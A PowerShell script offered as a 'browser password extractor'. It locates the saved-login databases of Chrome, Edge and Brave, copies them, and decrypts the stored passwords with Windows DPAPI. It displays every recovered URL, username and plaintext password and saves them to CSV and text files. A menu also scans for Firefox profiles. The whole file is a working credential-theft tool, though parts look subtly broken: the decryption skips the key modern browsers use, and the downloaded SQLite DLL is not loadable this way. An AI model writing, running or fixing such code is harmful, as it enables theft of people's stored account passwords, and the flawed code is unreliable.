# BrowserPasswordExtractor.ps1
# SIMPLE WORKING VERSION

# Banner
Write-Host ""
Write-Host "=============================================" -ForegroundColor Cyan
Write-Host "   SIMPLE BROWSER PASSWORD EXTRACTOR" -ForegroundColor Yellow
Write-Host "=============================================" -ForegroundColor Cyan
Write-Host ""

# Check if running as Admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsPrincipal] "Administrator")
if (-not $isAdmin) {
    Write-Host "‚ö†Ô∏è  WARNING: Run as Administrator for best results!" -ForegroundColor Red
    Write-Host ""
}

# Function to decrypt using DPAPI
function Decrypt-DPAPIData {
    param([byte[]]$Data)
    
    try {
        Add-Type -AssemblyName System.Security
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($Data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch {
        return $null
    }
}

# Get Chrome/Edge passwords (simple method)
function Get-ChromePasswords {
    $browsers = @(
        @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
        @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"},
        @{Name="Brave"; Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"}
    )
    
    $allPasswords = @()
    
    foreach ($browser in $browsers) {
        $dbPath = $browser.Path
        
        if (Test-Path $dbPath) {
            Write-Host "‚úÖ Found $($browser.Name) database" -ForegroundColor Green
            
            try {
                # Copy database to temp location (because browser locks it)
                $tempFile = "$env:TEMP\chrome_temp.db"
                if (Test-Path $tempFile) { Remove-Item $tempFile -Force }
                Copy-Item $dbPath $tempFile -Force
                
                # Check for SQLite DLL
                $sqlitePath = "$PSScriptRoot\System.Data.SQLite.dll"
                if (Test-Path $sqlitePath) {
                    Add-Type -Path $sqlitePath
                } else {
                    # Try to use ADO.NET
                    try {
                        Add-Type -AssemblyName System.Data.SQLite -ErrorAction Stop
                    } catch {
                        Write-Host "‚ùå SQLite not found. Downloading..." -ForegroundColor Yellow
                        # Download SQLite
                        $url = "https://www.sqlite.org/2023/sqlite-dll-win64-x64-3430200.zip"
                        $zipPath = "$env:TEMP\sqlite.zip"
                        Invoke-WebRequest -Uri $url -OutFile $zipPath
                        Expand-Archive -Path $zipPath -DestinationPath $env:TEMP -Force
                        $dllPath = Get-ChildItem "$env:TEMP\*.dll" | Select-Object -First 1
                        Add-Type -Path $dllPath.FullName
                    }
                }
                
                # Connect to database
                $conn = New-Object System.Data.SQLite.SQLiteConnection
                $conn.ConnectionString = "Data Source=$tempFile;Version=3;Read Only=True;"
                $conn.Open()
                
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
                
                $reader = $cmd.ExecuteReader()
                
                $count = 0
                while ($reader.Read()) {
                    $url = $reader.GetString(0)
                    $username = $reader.GetString(1)
                    
                    # Get password bytes
                    $passwordBytes = [byte[]]@()
                    if (-not $reader.IsDBNull(2)) {
                        $stream = $reader.GetStream(2)
                        $ms = New-Object System.IO.MemoryStream
                        $stream.CopyTo($ms)
                        $passwordBytes = $ms.ToArray()
                        $ms.Close()
                        $stream.Close()
                    }
                    
                    if ($passwordBytes.Length -gt 0) {
                        # Try to decrypt
                        $password = Decrypt-DPAPIData -Data $passwordBytes
                        if ($password) {
                            $allPasswords += [PSCustomObject]@{
                                Browser = $browser.Name
                                URL = $url
                                Username = $username
                                Password = $password
                            }
                            $count++
                        }
                    }
                }
                
                $reader.Close()
                $conn.Close()
                Remove-Item $tempFile -Force
                
                Write-Host "   Extracted $count passwords from $($browser.Name)" -ForegroundColor Green
                
            } catch {
                Write-Host "   ‚ùå Error reading $($browser.Name): $_" -ForegroundColor Red
            }
        } else {
            Write-Host "‚ùå $($browser.Name) not found at: $dbPath" -ForegroundColor Gray
        }
    }
    
    return $allPasswords
}

# Alternative: Simple text-based extraction (no SQLite required)
function Get-BrowserPasswordsSimple {
    Write-Host ""
    Write-Host "üìã Checking for saved passwords in browsers..." -ForegroundColor Cyan
    
    $results = @()
    
    # Check Chrome
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $chromePath) {
        Write-Host "‚úÖ Chrome passwords database found" -ForegroundColor Green
        
        # Simple check - just show that passwords exist
        $fileSize = (Get-Item $chromePath).Length
        $results += [PSCustomObject]@{
            Browser = "Chrome"
            Status = "Found ($([math]::Round($fileSize/1KB, 2)) KB database)"
            Action = "Use SQLite to extract"
        }
    }
    
    # Check Edge
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    if (Test-Path $edgePath) {
        Write-Host "‚úÖ Edge passwords database found" -ForegroundColor Green
        $fileSize = (Get-Item $edgePath).Length
        $results += [PSCustomObject]@{
            Browser = "Edge"
            Status = "Found ($([math]::Round($fileSize/1KB, 2)) KB database)"
            Action = "Use SQLite to extract"
        }
    }
    
    # Check Firefox
    $firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxProfiles) {
        $profile = Get-ChildItem $firefoxProfiles -Directory -Filter "*.default*" | Select-Object -First 1
        if ($profile) {
            Write-Host "‚úÖ Firefox profile found" -ForegroundColor Green
            $results += [PSCustomObject]@{
                Browser = "Firefox"
                Status = "Profile: $($profile.Name)"
                Action = "Use NSS library to decrypt"
            }
        }
    }
    
    return $results
}

# Main menu
function Show-Menu {
    Clear-Host
    Write-Host ""
    Write-Host "=============================================" -ForegroundColor Cyan
    Write-Host "   BROWSER PASSWORD EXTRACTOR MENU" -ForegroundColor Yellow
    Write-Host "=============================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "1. Extract Chrome/Edge Passwords (Requires SQLite)" -ForegroundColor White
    Write-Host "2. Check What's Available (Simple Scan)" -ForegroundColor White
    Write-Host "3. Download SQLite Library" -ForegroundColor White
    Write-Host "4. Exit" -ForegroundColor White
    Write-Host ""
}

# Download SQLite
function Download-SQLite {
    Write-Host ""
    Write-Host "üì• Downloading SQLite library..." -ForegroundColor Yellow
    
    try {
        # Download SQLite
        $url = "https://www.sqlite.org/2023/sqlite-dll-win64-x64-3430200.zip"
        $zipPath = "$env:TEMP\sqlite.zip"
        
        Write-Host "Downloading from: $url" -ForegroundColor Cyan
        Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing
        
        # Extract
        Expand-Archive -Path $zipPath -DestinationPath $env:TEMP -Force
        
        # Find and copy DLL
        $dllFiles = Get-ChildItem "$env:TEMP\*.dll" | Where-Object { $_.Name -match "sqlite" }
        if ($dllFiles) {
            $dllFile = $dllFiles[0]
            Copy-Item $dllFile.FullName ".\System.Data.SQLite.dll" -Force
            Write-Host "‚úÖ SQLite downloaded to: .\System.Data.SQLite.dll" -ForegroundColor Green
        } else {
            Write-Host "‚ùå Could not find SQLite DLL in downloaded files" -ForegroundColor Red
        }
        
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        
    } catch {
        Write-Host "‚ùå Download failed: $_" -ForegroundColor Red
        Write-Host "Please manually download SQLite from: https://www.sqlite.org/download.html" -ForegroundColor Yellow
    }
    
    Write-Host "Press any key to continue..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# Main execution loop
do {
    Show-Menu
    $choice = Read-Host "`nSelect option (1-4)"
    
    switch ($choice) {
        "1" {
            Write-Host ""
            Write-Host "üîç Extracting Chrome/Edge/Brave passwords..." -ForegroundColor Cyan
            Write-Host "Note: Make sure browsers are CLOSED!" -ForegroundColor Yellow
            Write-Host ""
            
            $passwords = Get-ChromePasswords
            
            if ($passwords.Count -gt 0) {
                Write-Host ""
                Write-Host "=" * 60 -ForegroundColor Green
                Write-Host "‚úÖ EXTRACTION SUCCESSFUL!" -ForegroundColor Green
                Write-Host "=" * 60 -ForegroundColor Green
                Write-Host ""
                
                # Display passwords
                $passwords | Format-Table -Property Browser, URL, Username, Password -AutoSize
                
                # Save to file
                $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
                $csvFile = "Extracted_Passwords_$timestamp.csv"
                $txtFile = "Extracted_Passwords_$timestamp.txt"
                
                $passwords | Export-Csv -Path $csvFile -NoTypeInformation -Encoding UTF8
                $passwords | Out-File -FilePath $txtFile -Encoding UTF8
                
                Write-Host ""
                Write-Host "üíæ Saved to:" -ForegroundColor Green
                Write-Host "   ‚Ä¢ $csvFile" -ForegroundColor White
                Write-Host "   ‚Ä¢ $txtFile" -ForegroundColor White
                
            } else {
                Write-Host ""
                Write-Host "‚ùå No passwords extracted. Possible reasons:" -ForegroundColor Red
                Write-Host "   1. Browsers are still running" -ForegroundColor Yellow
                Write-Host "   2. No saved passwords" -ForegroundColor Yellow
                Write-Host "   3. SQLite library missing" -ForegroundColor Yellow
                Write-Host "   4. Permission issues" -ForegroundColor Yellow
            }
            
            Write-Host ""
            Write-Host "Press any key to continue..." -ForegroundColor Gray
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        
        "2" {
            Write-Host ""
            Write-Host "üîç Scanning for browser data..." -ForegroundColor Cyan
            $scanResults = Get-BrowserPasswordsSimple
            
            if ($scanResults.Count -gt 0) {
                Write-Host ""
                Write-Host "=" * 60 -ForegroundColor Green
                Write-Host "üìä SCAN RESULTS" -ForegroundColor Green
                Write-Host "=" * 60 -ForegroundColor Green
                Write-Host ""
                
                $scanResults | Format-Table -AutoSize
                
                Write-Host ""
                Write-Host "üí° To extract passwords:" -ForegroundColor Yellow
                Write-Host "   1. Close ALL browsers" -ForegroundColor White
                Write-Host "   2. Run as Administrator" -ForegroundColor White
                Write-Host "   3. Download SQLite (Option 3)" -ForegroundColor White
                Write-Host "   4. Use Option 1 to extract" -ForegroundColor White
            } else {
                Write-Host "‚ùå No browser data found" -ForegroundColor Red
            }
            
            Write-Host ""
            Write-Host "Press any key to continue..." -ForegroundColor Gray
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        
        "3" {
            Download-SQLite
        }
        
        "4" {
            Write-Host ""
            Write-Host "üëã Exiting..." -ForegroundColor Cyan
            Write-Host ""
            break
        }
        
        default {
            Write-Host "Invalid choice. Press any key to try again." -ForegroundColor Red
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
    }
} while ($choice -ne "4")
